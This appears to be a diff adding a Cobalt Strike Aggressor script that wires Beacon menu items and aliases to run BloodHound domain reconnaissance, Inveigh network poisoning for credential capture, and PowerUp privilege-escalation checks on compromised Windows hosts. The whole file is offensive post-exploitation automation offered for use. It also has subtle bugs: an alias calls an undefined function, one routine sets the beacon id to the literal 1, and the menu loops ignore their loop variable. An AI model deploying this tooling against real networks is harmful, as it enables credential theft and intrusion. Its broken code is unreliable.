@@ -1,0 +1,110 @@
+# This Aggressor script loads some commonly used PowerShell tools, and adds menu bindings
+# 001SPARTaN
+
+#### RECON
+
+## BloodHound
+
+# Run BloodHound with default settings
+sub bloodhound {
+    bpowershell_import($1, script_resource("scripts/BloodHound.ps1")); # Change path to suit
+    bcd($1, "C:\\Temp");
+    bpowershell($1, "Invoke-BloodHound");
+}
+
+# Collect only sessions
+sub bloodhoundSessionsOnly {
+    bpowershell_import($1, script_resource("scripts/BloodHound.ps1"));
+    bcd($1, "C:\\Temp");
+    bpowershell($1, "Invoke-BloodHound -CollectionMethod Session");
+}
+
+# Alias to run BloodHound from Beacon quickly
+alias bloodhound {
+    bloodhound($1);
+}
+
+# Alias to run BloodHound session collection
+alias bloodhound_sessions {
+    sessionsOnly($1);
+}
+
+## Inveigh
+
+# Run Invoke-Inveigh for 60 minutes
+sub inveigh {
+    local('$bid');
+    $bid = $1;
+    bpowershell_import($bid, script_resource("scripts/Inveigh.ps1"));
+    bcd($bid, "C:\\Temp");
+    bpowershell($bid, "Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -RunTime 60");
+}
+
+# Run Invoke-InveighUnprivileged for 60 minutes
+sub inveighUnprivileged {
+    local('$bid');
+    $bid = 1;
+    bpowershell_import($bid, script_resource("scripts/Inveigh-Unprivileged.ps1"));
+    bcd($bid, "C:\\Temp");
+    bpowershell($bid, "Invoke-InveighUnprivileged -ConsoleOutput Y -FileOutput Y -RunTime 60");
+}
+
+alias inveigh {
+    inveigh($1);
+}
+
+alias inveigh_unprivileged {
+    inveighUnprivileged($1);
+}
+
+#### PRIVESC
+# Run PowerUp Invoke-AllChecks
+sub powerup {
+    bpowershell_import($1, script_resource("scripts/PowerUp.ps1"));
+    bpowershell($1, "Invoke-AllChecks");
+}
+
+alias powerup {
+    powerup($1);
+}
+
+# Add bindings to Beacon menu
+popup beacon_bottom {
+    menu "&Powershell" {
+        menu "&Recon" {
+            item "BloodHound" {
+                local('$bid');
+                foreach $bid ($1) {
+                    bloodhound ($1);
+                }
+            }
+            item "BloodHound (Sessions)" {
+                local('$bid');
+                foreach $bid ($1) {
+                    bloodhoundSessionsOnly($1);
+                }
+            }
+            separator();
+            item "Inveigh" {
+                local('$bid');
+                foreach $bid ($1) {
+                    inveigh($1);
+                }
+            }
+            item "Inveigh (Unprivileged)" {
+                local('$bid');
+                foreach $bid ($1) {
+                    inveighUnprivileged($1);
+                }
+            }
+        }
+        menu "&PrivEsc" {
+            item "PowerUp" {
+                local ('$bid');
+                foreach $bid ($1) {
+                    powerup($1);
+                }
+            }
+        }
+    }
+}
